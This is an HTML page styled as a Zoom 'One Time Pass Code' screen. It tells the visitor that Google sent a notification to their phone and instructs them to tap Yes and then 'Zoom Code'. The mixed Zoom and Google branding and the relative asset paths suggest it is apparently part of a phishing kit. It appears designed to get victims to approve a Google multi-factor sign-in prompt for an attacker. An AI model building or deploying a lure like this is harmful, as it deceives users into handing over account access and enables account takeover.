<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
  />

  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="../../logo.png" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Helvetica, Arial, sans-serif;
    }

    html,
    body {
      width: 100%;
      min-height: 100%;
      background-color: #ffffff;
      color: #202124;
      overflow: hidden;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    /* Main Container */
    .container {
      width: 100%;
      max-width: 420px;
      min-height: 100vh;

      display: flex;
      flex-direction: column;
      align-items: center;

      text-align: center;

      background: #ffffff;

      padding: 4vh 6vw 4vh 6vw;
    }

    /* Main Content */
    .content-box {
      width: 100%;

      display: flex;
      flex-direction: column;
      align-items: center;

      margin-top: 1vh;
    }

    /* Zoom Logo */
    .logo {
      width: clamp(45px, 13vw, 55px);
      height: auto;

      object-fit: contain;

      margin-bottom: 3vh;
    }

    /* Main Title */
    h1 {
      font-size: clamp(18px, 4.8vw, 22px);
      font-weight: 700;

      color: #1a1a1a;

      margin-bottom: 3vh;
    }

    /*
      PHONE ILLUSTRATION
      Responsive + Bigger
    */
    .phone-illustration {
      width: clamp(190px, 60vw, 250px);
      max-width: 250px;

      height: auto;

      display: block;
      object-fit: contain;

      margin-top: 0;
      margin-bottom: 3vh;
    }

    /* Sub Heading */
    h2 {
      font-size: clamp(16px, 4vw, 19px);
      font-weight: 700;

      color: #1a1a1a;

      margin-bottom: 1.2vh;
    }

    /* Description */
    .desc-text {
      font-size: clamp(13.5px, 3.5vw, 15px);

      font-weight: 600;

      color: #1f2937;

      line-height: 1.5;
    }

    .desc-text span {
      font-weight: 800;
      color: #000000;
    }

    /* Resend Button */
    .btn-join {
      background-color: #007aff;

      color: #ffffff;

      padding: 14px 0;

      width: 100%;
      max-width: 330px;

      font-size: 16px;
      font-weight: bold;

      border: none;
      border-radius: 12px;

      cursor: pointer;

      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.25);

      margin-top: 3vh;

      transition:
        background-color 0.2s,
        transform 0.1s;
    }

    .btn-join:hover {
      background-color: #005ec4;
    }

    .btn-join:active {
      transform: scale(0.98);
    }

    /*
      Small height phones
      Prevents content from becoming too tall
    */
    @media (max-height: 650px) {
      .container {
        padding-top: 2.5vh;
        padding-bottom: 2vh;
      }

      .logo {
        margin-bottom: 2vh;
      }

      h1 {
        margin-bottom: 2vh;
      }

      .phone-illustration {
        width: clamp(165px, 48vw, 210px);
        margin-bottom: 2vh;
      }

      .btn-join {
        margin-top: 2vh;
      }
    }

    /*
      Taller mobile screens
    */
    @media (min-height: 750px) {
      .phone-illustration {
        width: clamp(200px, 62vw, 250px);
      }
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="content-box">

      <!-- Zoom Logo -->
      <img
        class="logo"
        src="../../Zoom-Logo.png"
        alt="Zoom Logo"
      />

      <!-- Main Title -->
      <h1>One Time Pass Code</h1>

      <!-- Phone Illustration -->
      <img
        class="phone-illustration"
        src="../icon.gif"
        alt="Phone Illustration"
      />

      <!-- Sub Heading -->
      <h2>Check your phone.</h2>

      <!-- Description -->
      <p class="desc-text">
        Google sent a notification to your phone.<br />
        <span>Tap Yes</span> on the notification<br />
        Then Tap Zoom Code
      </p>

    </div>

    <!-- Resend Button -->
    <button
      class="btn-join"
      onclick="window.location.href='../'"
    >
      Resend
    </button>

  </div>

</body>
</html>
